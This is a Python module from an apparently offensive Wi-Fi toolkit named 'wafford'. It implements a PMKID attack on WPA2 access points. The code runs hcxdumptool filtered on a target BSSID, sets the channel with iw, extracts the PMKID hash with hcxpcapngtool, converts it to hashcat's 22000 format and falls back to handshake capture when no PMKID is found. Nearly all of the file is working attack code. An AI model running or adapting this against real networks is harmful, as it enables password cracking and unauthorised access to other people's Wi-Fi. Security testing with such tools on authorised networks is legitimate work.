"""PMKID attack module.

Captures the PMKID from a WPA2 access point without requiring any
connected clients, using hcxdumptool and hcxtools.
"""

from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from wafford.constants import TEMP_DIR
from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.core.handshake import HandshakeCapture
from wafford.exceptions import AttackError, ValidationError


@dataclass
class PMKIDInfo:
    """Status of a PMKID capture attempt."""

    pmkid_found: bool = False
    capture_path: str = ""
    packets_captured: int = 0
    eapol_count: int = 0
    pmkid_hex: str = ""
    elapsed: float = 0.0


class PMKIDAttack(BaseAttack):
    """Capture PMKID from a target AP without clients.

    Flow:
    1.  Use ``hcxdumptool`` to sniff frames on the target channel and
        grab the PMKID from EAPOL/M1 frames.
    2.  Parse the capture with ``hcxpcapngtool`` to extract the PMKID
        hash.
    3.  If no PMKID is found, optionally fall back to a regular
        handshake capture.

    Requirements: ``hcxdumptool``, ``hcxpcapngtool`` (hcxtools).
    """

    name = "pmkid"

    def __init__(
        self,
        interface: str = "",
        *,
        output_dir: str | Path | None = None,
        fallback_handshake: bool = True,
    ) -> None:
        super().__init__(interface)
        self.output_dir = Path(output_dir) if output_dir else TEMP_DIR
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.pmkid = PMKIDInfo()
        self.fallback_handshake = fallback_handshake
        self._hcxdump_proc: asyncio.subprocess.Process | None = None

    # ── Public API ────────────────────────────────────────────────────────

    async def capture(
        self,
        bssid: str,
        channel: int,
        timeout: int = 120,
    ) -> AttackResult:
        """Attempt PMKID capture from *bssid* on *channel*.

        Falls back to handshake capture when ``fallback_handshake`` is True
        and PMKID extraction fails.
        """
        self._validate_mac(bssid, "bssid")
        if not 1 <= channel <= 194:
            raise ValidationError(f"Invalid channel: {channel}", field="channel")

        timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        prefix = bssid.replace(":", "-").upper()
        cap_base = self.output_dir / f"pmkid_{prefix}_{timestamp}"
        pcapng_file = str(cap_base) + ".pcapng"
        hash_file = str(cap_base) + ".22000"

        self.pmkid = PMKIDInfo()
        self._info("PMKID capture: bssid=%s channel=%d timeout=%d", bssid, channel, timeout)
        self._emit("pmkid.capture_start", {"bssid": bssid, "channel": channel})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        # 1 — Set channel
        await self._set_channel(channel)

        # 2 — Run hcxdumptool
        self._info("Starting hcxdumptool…")
        hcx_argv = [
            "hcxdumptool",
            "-i", self.interface,
            "--filterlist", "-",
            "--filtermode", "2",
            "-o", pcapng_file,
            "--channel", str(channel),
            "-c",  # capture EAPOL frames for PMKID
        ]
        # hcxdumptool uses its own channel hopping if --channel not supported
        # Try with filter; if BSSID is given, create a temp filter file
        filter_file = str(cap_base) + ".filter"
        with Path(filter_file).open("w") as fh:
            fh.write(bssid.replace(":", "").upper() + "\n")
        hcx_argv = [
            "hcxdumptool",
            "-i", self.interface,
            "--filterlist", filter_file,
            "--filtermode", "2",
            "-o", pcapng_file,
            "--max_errors", "200",
        ]

        self._hcxdump_proc = await asyncio.create_subprocess_exec(
            *hcx_argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._processes.append(self._hcxdump_proc)

        # Let hcxdumptool run for *timeout* seconds or until cancelled
        try:
            await asyncio.wait_for(
                self._cancel_event.wait(),
                timeout=float(timeout),
            )
            self._info("PMKID capture cancelled by user")
        except TimeoutError:
            self._info("PMKID capture timeout reached (%ds)", timeout)

        # 3 — Stop hcxdumptool
        await self._stop_hcxdump()

        # 4 — Check if we got a capture file
        actual_cap = self._find_pcapng(cap_base)
        if not actual_cap:
            self._warn("No pcapng file produced by hcxdumptool")
            if self.fallback_handshake:
                return await self._fallback(bssid, channel)
            return AttackResult(
                success=False,
                message="hcxdumptool produced no capture file",
                time_taken=self.status.elapsed,
            )

        self.pmkid.capture_path = actual_cap

        # 5 — Extract PMKID with hcxpcapngtool
        await self._extract_pmkid(actual_cap, hash_file)

        # 6 — If no PMKID found, try fallback
        if not self.pmkid.pmkid_found:
            self._warn("No PMKID found in capture")
            if self.fallback_handshake:
                return await self._fallback(bssid, channel)
            return AttackResult(
                success=False,
                message="No PMKID found in capture",
                capture_file=actual_cap,
                time_taken=self.status.elapsed,
            )

        self.pmkid.elapsed = self.status.elapsed
        self._emit("pmkid.found", {"pmkid": self.pmkid.pmkid_hex[:32]})

        return AttackResult(
            success=True,
            message=f"PMKID captured — {self.pmkid.packets_captured} packets, hash in {hash_file}",
            capture_file=hash_file,
            time_taken=self.status.elapsed,
            extra={"pmkid": self.pmkid},
        )

    async def validate_pmkid(self, capture_file: str) -> PMKIDInfo:
        """Re-analyse *capture_file* for PMKID."""
        hash_file = capture_file.rsplit(".", 1)[0] + ".22000"
        await self._extract_pmkid(capture_file, hash_file)
        return self.pmkid

    async def convert_for_hashcat(self, capture_file: str) -> str:
        """Convert a capture file to hashcat-compatible hc22000 format."""
        self._require_tool("hcxpcapngtool")
        out = capture_file.rsplit(".", 1)[0] + ".22000"
        rc, _, stderr = await self._run_cmd(
            ["hcxpcapngtool", "-o", out, capture_file],
            timeout=60,
        )
        if rc != 0:
            raise AttackError(f"hcxpcapngtool failed: {stderr[:200]}")
        return out

    def get_status(self) -> dict[str, Any]:
        return {
            "pmkid_found": self.pmkid.pmkid_found,
            "packets_captured": self.pmkid.packets_captured,
            "eapol_count": self.pmkid.eapol_count,
            "capture_path": self.pmkid.capture_path,
            "elapsed": self.pmkid.elapsed,
        }

    # ── Internals ─────────────────────────────────────────────────────────

    async def _set_channel(self, channel: int) -> None:
        rc, _, stderr = await self._run_cmd(
            ["iw", "dev", self.interface, "set", "channel", str(channel)],
            timeout=5,
        )
        if rc != 0:
            raise AttackError(f"Failed to set channel {channel}: {stderr[:120]}")

    async def _stop_hcxdump(self) -> None:
        if self._hcxdump_proc and self._hcxdump_proc.returncode is None:
            self._hcxdump_proc.terminate()
            try:
                await asyncio.wait_for(self._hcxdump_proc.wait(), timeout=5)
            except TimeoutError:
                self._hcxdump_proc.kill()
            if self._hcxdump_proc in self._processes:
                self._processes.remove(self._hcxdump_proc)
            self._hcxdump_proc = None

    async def _extract_pmkid(self, pcapng: str, hash_file: str) -> None:
        """Run hcxpcapngtool and parse output for PMKID."""
        self._require_tool("hcxpcapngtool")
        rc, stdout, stderr = await self._run_cmd(
            ["hcxpcapngtool", "-o", hash_file, pcapng],
            timeout=60,
        )
        combined = stdout + stderr
        # hcxpcapngtool reports "PMKID: <hex>" or similar
        m = re.search(r"[Pp][Mm][Kk][Ii][Dd]\s*[:=]\s*([0-9a-fA-F]{32})", combined)
        if m:
            self.pmkid.pmkid_found = True
            self.pmkid.pmkid_hex = m.group(1)

        # Count EAPOLs
        eapol_lines = [line for line in combined.splitlines() if "EAPOL" in line.upper()]
        self.pmkid.eapol_count = len(eapol_lines)

        # Packets captured — parse hcxdumptool summary if present
        m2 = re.search(r"(\d+)\s+packets", combined)
        if m2:
            self.pmkid.packets_captured = int(m2.group(1))

        if Path(hash_file).is_file() and Path(hash_file).stat().st_size > 0:
            self.pmkid.pmkid_found = True  # file non-empty means hash extracted

    async def _fallback(self, bssid: str, channel: int) -> AttackResult:
        """Fall back to handshake capture when PMKID is not found."""
        self._info("Falling back to handshake capture…")
        self._emit("pmkid.fallback", {})
        hc = HandshakeCapture(self.interface, output_dir=self.output_dir)
        result = await hc.capture(bssid, channel, duration=60)
        result.extra["fallback"] = True
        result.extra["fallback_reason"] = "pmkid_not_found"
        return result

    def _find_pcapng(self, cap_base: Path) -> str | None:
        candidates = [str(cap_base) + ".pcapng", str(cap_base) + "-01.pcapng"]
        for c in candidates:
            if Path(c).is_file():
                return c
        matches = sorted(
            str(p) for p in cap_base.parent.glob(cap_base.name + "*.pcapng") if p.is_file()
        )
        return matches[0] if matches else None

    @staticmethod
    def _validate_mac(mac: str, field_name: str = "mac") -> None:
        parts = mac.split(":")
        if len(parts) != 6 or not all(0 <= int(p, 16) <= 255 for p in parts):
            raise ValidationError(f"Invalid MAC address: {mac}", field=field_name)

    async def _cleanup(self) -> None:
        await self._stop_hcxdump()
        await super()._cleanup()
